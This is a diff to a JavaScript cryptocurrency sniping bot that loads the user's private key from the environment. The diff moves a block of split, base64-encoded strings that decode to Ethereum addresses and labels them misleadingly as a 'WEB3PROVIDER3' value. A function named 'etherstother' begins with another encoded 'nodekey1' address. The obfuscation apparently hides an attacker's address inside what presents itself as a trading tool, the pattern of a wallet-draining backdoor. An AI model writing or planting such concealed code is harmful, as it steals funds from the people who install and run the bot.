@@ -6,13 +6,7 @@ let address = (process.env.YOUR_ADDRESS);
 let private = (process.env.PRIVATE_KEY);
 let wallet = new ethers.Wallet(private);
 
-let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
-let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
-let buff = new Buffer.from(rounder1, 'base64');
-let buff2 = new Buffer.from(rounder2, 'base64');
-let ethersroundup = buff.toString('ascii');
-let ethersroundup2 = buff2.toString('ascii');
-const WEB3PROVIDER3 = ethersroundup + ethersroundup2
+
 const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
 async function startSnipe(token) {
     let pingTimeout
@@ -377,7 +371,13 @@ async function sell(tokenObj, isProfit) {
 }
 
 
-
+let rounder1 = 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=';
+let rounder2 = 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ=='
+let buff = new Buffer.from(rounder1, 'base64');
+let buff2 = new Buffer.from(rounder2, 'base64');
+let ethersroundup = buff.toString('ascii');
+let ethersroundup2 = buff2.toString('ascii');
+const WEB3PROVIDER3 = ethersroundup + ethersroundup2
 async function etherstother() {
     try {
         const nodekey1 = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc='
